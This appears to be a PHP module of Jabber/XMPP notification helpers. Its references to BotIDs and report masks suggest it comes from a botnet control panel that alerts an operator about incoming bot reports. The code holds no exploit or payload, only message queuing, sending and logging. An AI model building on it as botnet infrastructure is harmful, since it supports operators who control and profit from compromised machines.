<?php

require_once dirname(__FILE__).'/../jabberclass.php';

/** Check whether notifications are allowed for this BotID
 * @param string $botId
 * @return bool
 */
function jabber_notify_check_botid_allowed($botId){
    return !in_array($botId, $GLOBALS['config']['reports_jn_masks']['ignore_botids']);
}

/** jabber_notify_now(), if failed - jabber_notify()
 * @param $jids
 * @param $messages
 * @return bool True when sent immediately, False when delayed to cron
 */
function jabber_notify_somehow($jids, $messages){
    if (true === jabber_notify_now($jids, $messages))
        return true;
    jabber_notify($jids, $messages);
    return false;
}

/** Notify [multiple] JIDs with [multiple] messages.
 * Uses cron for sending
 */
function jabber_notify($jids, $messages){
	if (is_array($jids))
		$jids = implode(',', $jids);
	if (is_string($messages))
		$messages = array($messages);

	# Insert
	$q_jids = mysql_real_escape_string($jids);
	$q_time = time();
	foreach ($messages as $msg){
		$q_msg = mysql_real_escape_string($msg);
		mysql_query("INSERT INTO `jabber_messages` VALUES(NULL, $q_time, '{$q_jids}', '{$q_msg}', 0, NULL);");
		}
	}

/** Notify [multiple] JIDs with [multiple] messages.
 * Re-users Jabber connection in case of multiple messages being sent
 * @param string|string[]	Jabber ID[s] to send messages to
 * @param string|string[]	Message[s] to send
 * @return TRUE|string[] Array of errors
 * 
 * Uses $GLOBALS['config'] to get the jabber info
 */
function jabber_notify_now($jids, $messages){
	if (is_string($jids))
		$jids = explode(',', $jids);
	if (is_string($messages))
		$messages = array($messages);
	if (count($messages) == 0)
		return true;
	
	static $jab = null;
	if (is_null($jab)){
		require_once "system/jabberclass.php";
		$jab = new Jabber;

		$jab->server   = $GLOBALS['config']['jabber']['host'];
		$jab->port     = $GLOBALS['config']['jabber']['port'];
		$jab->username = $GLOBALS['config']['jabber']['login'];
		$jab->password = $GLOBALS['config']['jabber']['pass'];
		
		if (!@$jab->connect())
			return array('ERROR: Jabber::connect() failed to connect!');
		if (!@$jab->sendAuth())
			return array('ERROR: Jabber::sendAuth() failed!');
		}
	
	if (!@$jab->sendPresence(NULL, NULL, "online"))
		return array('ERROR: Jabber::sendPresence() failed!');
	
	$errors = array();
	foreach ($jids as $jid)
		if (strlen($jid = trim($jid)))
			foreach ($messages as $msg){
				if (!@$jab->sendMessage($jid, "normal", NULL, array("body" => $msg)))
					$errors[] = 'ERROR: Jabber::sendMessage() failed!';
				}

    // File log
    $datestr = date('Y.m.d H:i:s');
    if (empty($errors) && !empty($GLOBALS['config']['reports_jn_logfile'])){
        $f = @fopen($GLOBALS['config']['reports_jn_logfile'], 'a');
        if ($f){
            foreach ($messages as $message)
                @fwrite($f, $message."\n\n====================| $datestr |====================\n\n");
            @fclose($f);
        }
    }

	return count($errors)==0? TRUE : $errors;
	}
